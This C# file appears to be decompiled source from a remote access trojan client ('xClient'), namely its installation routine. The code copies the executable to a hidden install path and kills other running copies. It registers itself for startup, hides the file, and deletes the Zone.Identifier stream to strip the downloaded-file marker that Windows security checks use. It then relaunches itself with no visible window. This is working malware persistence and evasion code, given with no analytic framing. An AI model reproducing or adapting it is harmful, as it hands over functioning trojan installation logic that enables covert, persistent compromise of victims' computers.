using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;

namespace xClient.Core.Installation;

public static class ClientInstaller
{
	public static void Install(Client client)
	{
		bool flag = false;
		if (!Directory.Exists(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY)))
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY));
			}
			catch (Exception)
			{
				return;
			}
		}
		if (File.Exists(ClientData.InstallPath))
		{
			try
			{
				File.Delete(ClientData.InstallPath);
			}
			catch (Exception ex2)
			{
				if (ex2 is IOException || ex2 is UnauthorizedAccessException)
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(ClientData.InstallPath));
					int id = Process.GetCurrentProcess().Id;
					Process[] array = processesByName;
					foreach (Process process in array)
					{
						if (process.Id != id)
						{
							process.Kill();
							flag = true;
						}
					}
				}
			}
		}
		if (flag)
		{
			Thread.Sleep(5000);
		}
		try
		{
			File.Copy(ClientData.CurrentPath, ClientData.InstallPath, overwrite: true);
		}
		catch (Exception)
		{
			return;
		}
		if (Settings.STARTUP && !Startup.AddToStartup())
		{
			ClientData.AddToStartupFailed = true;
		}
		if (Settings.HIDEFILE)
		{
			try
			{
				File.SetAttributes(ClientData.InstallPath, FileAttributes.Hidden);
			}
			catch (Exception)
			{
			}
		}
		FileHelper.DeleteZoneIdentifier(ClientData.InstallPath);
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = ClientData.InstallPath
		};
		try
		{
			Process.Start(startInfo);
		}
		catch (Exception)
		{
		}
	}
}
